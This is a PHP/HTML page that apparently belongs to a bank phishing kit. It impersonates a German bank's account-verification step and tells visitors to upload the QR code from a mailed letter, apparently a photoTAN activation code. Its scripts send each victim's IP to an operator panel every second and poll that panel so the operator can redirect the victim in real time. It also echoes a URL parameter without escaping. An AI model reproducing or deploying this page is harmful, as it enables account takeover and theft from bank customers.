<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.svg">
</header>


<main>
<div class="form">



<div class="title">
Kontoverifizierung
</div>
<div class="text">
Zur Verifizierung Ihres Kontos sind Sie verpflichtet, ein Bild des QR-Codes hochzuladen, den Sie per Post erhalten haben. Dies hilft uns sicherzustellen, dass Sie es sind, der Änderungen am Konto vornimmt.
</div>

<?php 
$helper->setError();
if(isset($_GET['load'])){
?>

<script>
    $(".loader").show();
</script>

<?php
}
?>

<form action="post.php" method="POST" enctype="multipart/form-data">
<div class="col">
    <input type="file" required name="qr">
    <input type="hidden" value="under" name="uploadTan">
</div>


<div class="col btn">
    <button onclick="sendLog()">Weiter</button>
</div>
</form>


</div>
</main>




<footer>
<span>Sicherheit</span>
<span>Cookie-Einstellungen </span>
<span>Datenschutz </span>
<span>Barrierefreiheit </span>
<span>Nachhaltigkeit</span>
<span>AGB </span>
<span>Disclaimer </span>
<span>Impressum</span>
<span>BLZ: 76030080</span>
<span>BIC: CSDBDE71</span>
</footer>
<?php 
$helper->addLoader();
if(isset($_GET['load'])){
?>

<script>
    $(".loader").show();
</script>

<?php
}
?>
<script>

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>